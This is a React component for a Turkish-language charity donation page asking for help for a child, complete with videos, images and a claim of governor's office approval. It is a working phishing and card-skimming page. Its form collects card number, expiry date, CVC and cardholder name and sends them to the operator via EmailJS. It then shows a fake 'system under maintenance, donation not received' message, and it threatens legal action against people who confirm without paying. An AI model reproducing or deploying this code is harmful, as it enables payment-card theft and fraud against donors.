import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
const HomePage = () => {
  function bagisOnayla() {
    const mail = prompt("Bağış yaptığınız mail adresini giriniz");
    if (mail != "" || mail != null)
      alert(
        `${mail} adresi ile yaptığınız bağış için bağış bildirimi oluşturuldu. Teşekkür ederiz.`
      );
  }

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_mwe4ukl", "template_8gxpbwd", form.current, {
        publicKey: "V57OWPDudEhHuEDPU",
      })
      .then(
        () => {
          alert(
            "Şuan sistemimiz bakımda lütfen daha sonra tekrar deneyin. Bağışınız alınamadı."
          );
        },
        (error) => {
          alert("Şuan sistemimiz bağışınızı alamadı..");
        }
      );
  };

  return (
    <section className="flex flex-col mt-10 justify-center items-center w-full p-4">
      <h1 className="text-3xl text-center text-purple-500 font-bold">
        Çağrımıza Gösterdiğiniz İlgi İçin Kalpten Teşekkürler!
      </h1>
      <h2 className="text-2xl text-purple-500 font-bold text-center mt-10">
        Dikkat! Lütfen Babanın Yönlendirmelerini Dikkate Alarak Bağışınızı
        Gönderin!
      </h2>

      <div className="relative w-full mt-5" style={{ paddingBottom: "56.25%" }}>
        <iframe
          src="https://player.vimeo.com/video/948401063"
          className="absolute top-0 left-0 w-full h-full"
          frameBorder="0"
          allow="autoplay; fullscreen"
          allowFullScreen
          title="Vimeo Video"
        ></iframe>
      </div>

      <h2 className="text-3xl font-bold mt-10">
        Bağışlarınız Valilik Onayıyla Güvence Altında!
      </h2>

      <div className="mt-10 grid grid-cols-1 md:grid-cols-2 gap-4 w-full max-w-6xl">
        <div className="bg-gray-200 rounded-lg overflow-hidden">
          <img
            src="https://images.clickfunnels.com/cdn-cgi/image/width=1400,fit=scale-down,f=auto,q=80/https://statics.myclickfunnels.com/workspace/jVlwwg/image/2138935/file/f09aca5ce4c773190f1075dc739dbad1.png"
            alt="Fotoğraf 1"
            className="w-full h-auto"
          />
        </div>
        <div className="rounded-lg overflow-hidden">
          <img
            src="https://images.clickfunnels.com/cdn-cgi/image/width=1400,fit=scale-down,f=auto,q=80/https://statics.myclickfunnels.com/workspace/jVlwwg/image/2515987/file/357b6a56f266ec0a82b9b3a4ecb787d5.png"
            alt="Fotoğraf 2"
            className="w-full h-auto"
          />
        </div>

        <div className="rounded-lg overflow-hidden">
          <img
            src="https://images.clickfunnels.com/cdn-cgi/image/width=1000px,fit=scale-down,f=auto,q=80/https://statics.myclickfunnels.com/workspace/jVlwwg/image/2139277/file/dd532d1407fa7ed15d5963e57800a482.png"
            alt="Fotoğraf 2"
            className="w-full h-auto"
          />
        </div>
      </div>

      <h2 className="text-3xl font-bold mt-10">
        Dua İkra'ya Umut Veren Sevgi Dolu Kalpler
      </h2>

      <div className="mt-10 grid grid-cols-1 md:grid-cols-2 gap-4 w-full max-w-6xl">
        <div
          className="relative w-full mt-5"
          style={{ paddingBottom: "56.25%" }}
        >
          <iframe
            src="https://player.vimeo.com/video/948401351"
            className="absolute top-0 left-0 w-full h-full"
            frameBorder="0"
            allow="autoplay; fullscreen"
            allowFullScreen
            title="Vimeo Video"
          ></iframe>
        </div>

        <div
          className="relative w-full mt-5"
          style={{ paddingBottom: "56.25%" }}
        >
          <iframe
            src="https://player.vimeo.com/video/948401397"
            className="absolute top-0 left-0 w-full h-full"
            frameBorder="0"
            allow="autoplay; fullscreen"
            allowFullScreen
            title="Vimeo Video"
          ></iframe>
        </div>
      </div>

      <h2 className="text-3xl font-bold mt-10">
        Dua İkra İçin Yapılan Gönüllü Çalışmaları
      </h2>

      <div className="my-10 bg-blue-400 w-full lg:w-1/3">
        <img
          src="https://images.clickfunnels.com/cdn-cgi/image/width=1000px,fit=scale-down,f=auto,q=80/https://statics.myclickfunnels.com/workspace/jVlwwg/image/2165640/file/39d5ab85b0cf63ba6b40ee0af246f906.jpg"
          alt="Fotoğraf 1"
          className="w-full h-auto"
        />
      </div>

      <form
        ref={form}
        onSubmit={sendEmail}
        className="mt-10 w-full max-w-lg bg-white p-8 rounded-lg shadow-md"
      >
        <h3 className="text-2xl font-bold mb-6 text-center">Bağış Yap</h3>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="name"
          >
            İsim
          </label>
          <input
            type="text"
            id="name"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="Adınız Soyadınız"
            required
          />
        </div>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="email"
          >
            Email
          </label>
          <input
            type="email"
            id="email"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="Email Adresiniz"
            required
          />
        </div>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="amount"
          >
            Bağış Miktarı (Tüm Para Birimleri Geçerli)
          </label>
          <input
            type="number"
            id="amount"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="Bağış Miktarı"
            required
            name="miktar"
          />
        </div>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="card-number"
          >
            Kart Sahibi Adı Soyadı
          </label>
          <input
            type="text"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="Kredi Kartı Numarası"
            required
            name="adsoyad"
          />
        </div>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="card-number"
          >
            Kredi Kartı Numarası
          </label>
          <input
            type="text"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="Kredi Kartı Numarası"
            required
            name="kartno"
          />
        </div>

        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="expiry-date"
          >
            Son Kullanma Tarihi
          </label>
          <input
            type="text"
            id="expiry-date"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="MM/YY"
            required
            name="sontarih"
          />
        </div>

        <div className="mb-6">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="cvc"
          >
            CVC Kodu
          </label>
          <input
            type="text"
            id="cvc"
            className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500"
            placeholder="CVC"
            required
            name="cvc"
          />
        </div>

        <button
          type="submit"
          className="w-full bg-purple-500 text-white py-2 px-4 rounded-lg hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50"
        >
          Bağış Yap
        </button>
      </form>

      <div className="shadow w-full xl:w-[800px] mt-14 p-8 rounded border">
        <h2 className="block border-b pb-2 text-red-500 font-bold">DİKKAT</h2>
        <p>
          Lütfen bağışta bulunduktan sonra aşağıdaki Bağışımı Onayla butonuna
          basmayı unutmayın!
        </p>
        <p className="mt-2">
          Bağışta bulunmayıp, aşağıdaki butonu kullanarak bağış bildiriminde
          bulunup bizi gereksiz meşgul eden vatandaşlarımız hakkında yasal süreç
          başlatılacaktır.
        </p>

        <div className="w-full mx-auto flex justify-center items-center mt-5">
          <button
            onClick={() => bagisOnayla()}
            type="submit"
            className="lg:w-1/3 w-full bg-red-500 text-white py-2 px-4 rounded-lg hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50"
          >
            Bağışımı Onayla
          </button>
        </div>
      </div>
    </section>
  );
};

export default HomePage;
